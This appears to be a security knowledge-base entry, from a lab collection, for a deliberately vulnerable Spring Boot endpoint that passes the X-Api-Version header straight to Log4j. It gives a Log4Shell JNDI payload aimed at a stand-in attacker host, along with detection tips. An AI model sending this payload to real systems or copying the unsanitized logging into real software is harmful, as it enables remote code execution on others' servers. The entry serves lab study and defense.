---
id: 9e479737-2cff-4911-80a2-9f9730e38235
name: vulnerable-log4shell-java-endpoint
type: code
language: Java
verified: true
created_at: '2023-04-06T03:55:56.633594+00:00'
updated_at: '2023-04-06T03:55:56.643424+00:00'
platforms:
  - Java
tags:
  - vulnerable-code
  - log4shell
  - spring-boot
validated: true
---

# vulnerable-log4shell-java-endpoint

## Code

```java
public String index(@RequestHeader("X-Api-Version") String apiVersion) {
    logger.info("Received a request for API version " + apiVersion);
    return "Hello, world!";
}
```

## Description

This Java code snippet represents a vulnerable Spring Boot controller endpoint that logs a user-supplied HTTP header (X-Api-Version) without sanitization. When using vulnerable Log4j (pre-2.15), this allows Log4Shell exploitation via JNDI payloads in the header, leading to RCE. It is included here as an example of the code pattern in the Dockerized vulnerable app being exploited.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| `apiVersion` | User-controlled string from the X-Api-Version header, logged directly | `${jndi:ldap://attacker.com/a}` |
| `logger` | Log4j logger instance (assumed vulnerable) | N/A |

## Usage

This code is part of a Spring @RestController in the vulnerable Docker app. Deploy via the procedure, then target the /api/version endpoint with payloads. Use for understanding or reproducing the vuln in labs; never deploy in production without patching.

## Detection

- Static analysis: Scan for unsanitized logger.info() on user input in Java/Spring apps.
- Dynamic: Monitor logs for JNDI patterns like `${jndi:}` or outbound connections from app servers.
- Tools: Use grep for 'logger.info' in source, or SAST like SonarQube for Log4j vulns.

## Related

- [[procedures/Log4Shell-Exploitation-via-Docker]]
- [[tools/Docker]]
